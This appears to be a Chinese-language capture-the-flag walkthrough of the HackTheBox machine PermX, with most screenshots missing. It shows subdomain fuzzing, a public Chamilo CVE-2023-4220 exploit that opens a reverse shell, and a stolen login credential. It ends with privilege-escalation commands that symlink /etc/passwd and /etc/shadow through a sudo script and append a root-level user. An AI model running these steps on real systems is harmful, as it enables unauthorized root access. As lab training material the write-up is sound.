# PermX

端口扫描

![image-20240729163054151](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729163054151.png)



子域名枚举

```
ffuf -u http://permx.htb -w /home/kali/Desktop/pass/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fw 18 -H "HOST: FUZZ.permx.htb"
```

![image-20240729173256115](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729173256115.png)

发现两个域名www,lms,添加到/etc/hosts文件

![image-20240729173447155](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729173447155.png)

![image-20240729173552571](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729173552571.png)

发现一个登录页面

![image-20240729173606097](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729173606097.png)

网站框架是Chamlio

![image-20240729173857314](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729173857314.png)



攻击脚本https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit

在reverse.php中修改ip和端口

![image-20240729174851149](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729174851149.png)

运行脚本,成功弹shell

![image-20240729174917801](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729174917801.png)



访问/main/inc/lib/javascript/bigupload/files/,发现脚本成功上传

![image-20240729175058691](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729175058691.png)

上传linepeas.sh到/var/www/html目录下

![image-20240729185157746](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729185157746.png)

![image-20240729185533265](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729185533265.png)

运行linpeas.sh

![image-20240729190205921](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729190205921.png)

尝试用mtz/03F6lY3uXAP2bkW8登录

![image-20240729190413715](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729190413715.png)

sudo -l查看可执行的命令

![image-20240729190500653](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729190500653.png)

查看/opt/acl.sh文件

![image-20240729190650293](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729190650293.png)

setfacl是linux设置facl权限位的命令，作用类似chmod,分析文件可知我们通过运行acl.sh来给当前用户目录下文件的设置权限，可以把/etc/sudoers设置为可读可写，但需要设置一个软链接

```
ln -s /etc/passwd passwd
ln -s /etc/shadow shadow
sudo /opt/acl.sh mtz rwx /home/mtz/passwd
sudo /opt/acl.sh mtz rwx /home/mtz/shadow

perl -le 'print crypt("123456","addedsalt")'
openssl passwd -1 test

echo 'test:x:0:0:root:/root:/bin/bash'>>passwd
echo 'test:$1$ulIlUQk7$tN.fX9/6zYfyYWgfqvqFX.:19778:0:99999:7:::'>>shadow

```



![image-20240729202140005](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240729202140005.png)





